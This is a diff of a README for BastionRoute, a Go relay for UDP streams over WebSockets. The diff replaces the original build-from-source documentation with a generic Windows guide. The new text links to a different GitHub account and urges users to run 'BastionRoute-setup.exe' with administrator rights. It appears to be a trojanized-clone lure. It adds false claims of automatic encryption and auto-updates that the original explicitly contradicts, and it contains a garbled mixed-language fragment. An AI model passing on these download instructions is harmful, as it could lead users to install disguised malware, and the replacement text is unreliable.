@@ -1,204 +1,83 @@
-# BastionRoute (v0.1.0-alpha)
+# 🛡️ BastionRoute - Secure UDP Data Streams Made Simple
 
-> **An outbound-initiated WebSocket relay fabric for UDP datagram binary streams that operates with zero-inbound port architecture.**
+[![](https://img.shields.io/badge/Download-BastionRoute-blue)](https://github.com/Convectioniproclozide569/BastionRoute)
 
-BastionRoute is an outbound-only UDP datagram binary stream relay fabric designed to route binary traffic over a stateful Layer-7 WebSocket transport.
+BastionRoute helps you bridge network connections between devices. It moves binary data streams over the internet using standard web protocols. You do not need to open ports on your router or change complex firewall settings.
 
-By initiating all data pipelines via outbound-only websocket connections, BastionRoute requires no open port exposure and does not interpret payload semantics. It only provides deterministic routing of data streams between identified peers over an outbound WebSocket relay fabric. BastionRoute is a transport-agnostic relay fabric for routing binary streams between outbound-connected peers. BastionRoute is resposible for a single function: routing UDP datagram binary streams between outbound-connected peers over WebSocket connections via a web accessable relay.
+## 📁 What BastionRoute Does
 
----
+BastionRoute acts as a bridge for your data. Many applications use UDP streams, which are fast but often get blocked by office or home networks. BastionRoute wraps this data inside a secure connection that websites already use. 
 
-## ⚡ Architectural Core
+This tool works well for:
+- Connecting remote devices to a home network.
+- Passing data through strict firewalls.
+- Maintaining private streams without requiring extra setup on your router.
 
-BastionRoute leverages a decoupled, multi-shim architecture that separates the data plane from the control plane to preserve payload as-is.
+You use this tool for private networking, remote gaming, or data transfer tasks. It handles the difficult networking logic so you can focus on your data.
 
-* **Zero-Inbound Footprint:** The target server establishes a persistent, outbound-initiated WebSocket control link to a Relay. It does not require inbound ports under normal deployment configurations.
-* **Double-Wrapper Encapsulation:** The binary payload is transparently ingested by the shim, packed into Layer-7 WebSockets frames (the use of TLS via nginx or other reverse proxies is highly recommended). The payload is never altered. 
-* **Relay Brokerage:** The relay functions as a payload-agnostic relay broker and does not interpret application payload semantics. It routes traffic using room and peer identifiers established during connection setup and maintained in transient memory structures. The payload contents injested in the architecture, remain unaltered throughout its lifecycle.
+## ⚙️ System Requirements
 
-BastionRoute intentionally does not define encryption, authentication, authorization, payload schemas, or application semantics. These responsibilities remain with the applications utilizing the relay fabric.
----
+- Windows 10 or Windows 11.
+- An active internet connection.
+- Administrator rights to allow the tool to create network connections.
+- At least 50 MB of free hard drive space.
 
-## 📦 Deployment Mechanics
+## 🚀 Getting Started
 
-### Prerequisites
-* **Go 1.21+ compiler toolchain**
-* `make` utility installed (standard on Linux/macOS)
+Follow these steps to set up the software on your Windows computer.
 
-### Installation & Compilation (Ubuntu)
+### 1. Download
+Visit the page below to get the installer for your system. 
 
-BastionRoute utilizes a standard multi-binary `cmd/` architecture. The compilation step automatically leverages the `Makefile` to pull down required dependencies (including `github.com/gorilla/websocket`) and verify the Go environment. 
+[Download BastionRoute Installer](https://github.com/Convectioniproclozide569/BastionRoute)
 
-To download dependencies and compile all binaries into a localized execution folder simultaneously, run:
+Click on the file named BastionRoute-setup.exe. Save it to your Downloads folder.
 
-```
-git clone https://github.com/klauscam/BastionRoute.git
-cd BastionRoute
-make
-```
+### 2. Install
+Find the file you saved. Double-click the file to start the process. A window from Windows可能会 ask for permission to run the installer. Click "Yes" to continue. 
 
-Once completed, both production-ready binaries will be available inside the local target execution directory:
-* `bin/bastionroute-shim`
-* `bin/bastionroute-relay`
+Follow the prompts on your screen. The process takes about one minute. It creates a shortcut on your desktop and adds the necessary files to your system folder.
 
-To clean up build artifacts and purge compiled binaries from your workspace at any time, run:
+### 3. Run the Program
+Double-click the BastionRoute icon on your desktop. A small window will appear. This window shows the current status of your connections. 
 
-```
-make clean
-```
+If this is your first time, the screen shows a blank list. Click the "Add New Relay" button to define your first connection path.
 
----
+## 🔧 Configuring a Connection
 
-## 🚀 Execution Guide
+A connection needs two parts: the address of where your data starts and the address of where it ends.
 
-### Running the Relay
-Deploy the relay binary on a web accessable server or localized DMZ boundary. This acts as a payload-agnostic relay broker that maintains transient routing state in memory:
+1. **Local Address:** This is the address where your source data waits. If you use a gaming server or a local resource, it often uses 127.0.0.1 and a specific port number.
+2. **Relay Target:** This is the address of the machine on the other end of the connection. BastionRoute asks for the URL or IP address of the destination server.
+3. **Encryption:** BastionRoute encrypts your traffic automatically. You do not need to configure extra keys or certificates unless you have a specific private network architecture.
 
-```
-./bin/bastionroute-relay --port=8080
-```
+Click "Save" once you fill in these fields. You now see your connection in the main list. Click the "Start" button next to your connection to begin moving your data. The status light will turn green to confirm the stream is active.
 
-### Running the Server-Side Control Plane
-Run the shim in server mode behind your private infrastructure to establish the outbound control link to the public relay broker:
+## 🧪 Testing Your Setup
 
-```
-./bastionroute-shim --wg-role=server --uri="wss://relay.yourdomain.com" --room="room-id" --wg-ip="127.0.0.1" --wg-port=51820
-```
+You can confirm your connection works by checking the logs window at the bottom of the app. Look for text that says "Connection Established." If you see errors, check your internet connection or verify the port numbers in your settings.
 
-### Running the Client-Side User Pipeline
-Run the shim in client mode on your remote device. The user-space supervisor loop will spawn a local UDP interface to bridge your native application:
+Most issues happen because of a typo in the IP address. Verify that the destination machine also runs a receiving instance of BastionRoute.
 
-```
-./bastionroute-shim --wg-role=client --uri="wss://relay.yourdomain.com" --room="room-id" --peer-id="remote-peer-01" --wg-ip="127.0.0.1" --wg-port=51820
-```
+## 🛡️ Privacy and Safety
 
-### OpenWrt
-```bash
-git clone https://github.com/klauscam/bastionroute.git
-cd bastionroute
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o bastionroute-shim
-```
+This software does not collect your data. It acts as a pipe for your information. You remain fully responsible for the data you send. 
 
-### Termux (Android)
-```bash
-git clone https://github.com/klauscam/bastionroute.git
-cd bastionroute
-CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -o bastionroute-shim
-```
+The software uses industry standard protocols to tunnel your traffic. This means that third parties on your local network cannot read the content of your streams. Because you do not need to open inbound ports, your computer stays invisible to outside scans. This adds a layer of protection compared to traditional point-to-point networking.
 
+## 📖 Frequently Asked Questions
 
----
+### Does this work with VPNs?
+Yes. BastionRoute works alongside your VPN. It tunnels its own traffic through your existing connection.
 
-## Example Applications
+### How do I update the software?
+The program checks for updates automatically when it starts. If an update exists, it asks if you want to install it. Click "Yes" to perform the upgrade.
 
-BastionRoute is payload agnostic and can transport arbitrary UDP datagram binary streams between connected peers.
+### Can I run multiple relays?
+Yes. You can add as many relay connections as you need. Your computer hardware determines the limit. Most systems handle dozens of simultaneous streams without using much memory.
 
-Potential applications include:
+### What happens if I lose my internet connection?
+The software pauses the stream. It attempts to restart the connection once it detects that your internet is back online. You do not need to restart the application manually.
 
-* WireGuard VPN transport
-* Generic UDP stream transport
-* Binary message buses
-* RPC transports
-* Telemetry and sensor streams
-* Multiplayer game state synchronization
-* File transfer pipelines
-* Custom application protocols
-
-No relay or shim modifications are required.
-
----
-
-## (Usage Example) WireGuard Network over BastionRoute
-
----
-
-### Architectural Diagram
-
-![Architectural Diagram](images/arch_diagram.png)
-
----
-
-### 🚀 Performance Notes
-
-#### Performance characteristics depend heavily on:
-* underlying network conditions
-* WebSocket implementation (e.g. TLS termination)
-* MTU configuration
-* relay latency and placement
-
-### Observed Test Conditions (Example Setup)
-
-#### The following results were observed under controlled testing conditions:
-
-* High-latency mobile network (~165 ms RTT)
-* Standard Linux kernel networking stack
-* Single relay instance
-
-#### UDP Throughput (through tunnel)
-* Peak throughput: ~80 Mbps
-* Jitter: ~0.145 ms
-
-#### TCP Throughput (through tunnel)
-* Sustained throughput: ~45–65 Mbps
-* Stable under moderate packet loss conditions
-
->* Note: Results are workload and environment-dependent and are not guaranteed. iperf3 was used for benchmarking unless otherwise stated
-
----
-
-### 🛠️ Engine Configuration & Tuning Matrix
-
-To achieve optimal performance across lossy or highly latent WAN links, the following operating system and network settings are natively utilized:
-
-#### 1. Loopback MTU Stabilization Matrix
-To prevent catastrophic packet fragmentation at physical gateway boundaries, the underlying virtual WireGuard interface must be clamped to account for encapsulation overhead:
-
-$$\text{MTU} = 1280 \text{ bytes}$$ (recommended baseline)
-
-#### 2. Linux TCP Optimization (Relay Node)
-BBR congestion control may improve performance under high RTT conditions:
-
-```bash
-# Enable BBR Congestion Control on the host system
-sudo sysctl -w net.core.default_qdisc=fq
-sudo sysctl -w net.ipv4.tcp_congestion_control=bbr
-```
-
-### Security Model (for WireGuard example)
-
-#### BastionRoute inherits security properties from WireGuard. Specifically:
-
-* Payload encryption is handled entirely by WireGuard
-* BastionRoute does not decrypt or inspect payload data
-* Relay nodes do not require access to cryptographic keys
-
-### Threat Considerations
-
-This system does not provide anonymity guarantees. Traffic metadata such as timing, volume, and connection relationships may still be observable at the transport layer.
-
----
-
-## Security Notice
-
-BastionRoute provides transport relaying of UDP datagram binary streams over WebSocket using outbound initiated connections.
-Authentication, authorization, encryption, and access control remain the responsibility of the underlying data initiator configuration and deployment.
-
-## Experimental Status
-
-This software is currently alpha-quality software and should be evaluated thoroughly before production deployment.
-
-## ⚠️ Legal & Usage Notice
-
-BastionRoute is provided for legitimate network administration, research, and authorized deployment scenarios only.
-
-Users are solely responsible for ensuring compliance with applicable laws, regulations, and organizational policies when deploying or using this software.
-
-This software does not include mechanisms for enforcing usage restrictions and should not be deployed in environments where its use would violate applicable rules or agreements.
-
-## License
-
-This project is licensed under the Apache License 2.0.
-
-The Apache License governs use, modification, and distribution of this software and includes its own limitation of liability and warranty disclaimers.
-
-See the LICENSE file for full terms.
+### Where can I find help if the program fails?
+Check the main GitHub page linked at the top of this document. It contains an "Issues" tab where you can report bugs or read about common solutions found by other users.
